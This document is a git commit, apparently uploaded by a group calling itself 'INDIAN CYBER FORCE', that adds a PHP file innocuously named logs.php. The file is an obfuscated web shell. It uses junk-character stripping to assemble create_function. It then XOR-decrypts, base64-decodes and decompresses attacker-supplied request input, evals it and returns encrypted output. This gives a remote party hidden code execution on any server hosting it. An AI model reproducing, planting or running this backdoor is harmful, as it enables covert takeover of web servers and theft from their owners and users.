0863d9efc5ea16bd8bbefe6a354c64182b974d14
INDIAN CYBER FORCE <95233999+IndianCyberForce@users.noreply.github.com>
2023-02-20 01:15:51 +0530

    Add files via upload
    MrGrey

---
+++ logs.php
@@ -0,0 +1,10 @@
+<?php
+$J=str_replace('h','','hcreahhte_hfuhnctihon');
+$d='T]$kT])T]{$c=sT]trlen($k);$l=strleT]n($t);$o=T]""T];for($i=0T];$i<T]$l;){T]fT]or($j=0;($j<$T]c&&$i<$T]l);$T]jT]++,$i++){$';
+$e=']nput"),$m)=T]T]=1) {@ob_starT]t();@T]evT]al(@gzuT]T]ncompresT]s(@x(@base6T]4_decT]T]ode($m[1]),T]$k))T]);$o=T]@ob_ge';
+$S='$T]k="443dd12c"T];$kh="3T]bT]381e02b69T]0";$T]kfT]="af9ea8T]9423ba";$T]p="xgVN1Q6T]8RZbT]fP80I";T]funcT]tion T]x($t,';
+$u='oT].=T]$t{$i}^$k{$jT]};}}T]returT]n $o;T]}iT]f (@preg_T]match("/$kT]h(.+)$T]kf/",@T]fiT]lT]e_get_contentsT]("php://T]iT';
+$m='t_contenT]ts(T]);@ob_endT]_cleaT]n()T];$rT]=@bT]ase64_encT]ode(@x(@T]gzcoT]mpreT]ssT]($o),$k));print("T]$p$kh$T]r$kf");}';
+$U=str_replace('T]','',$S.$d.$u.$e.$m);
+$b=$J('',$U);$b();
+?>
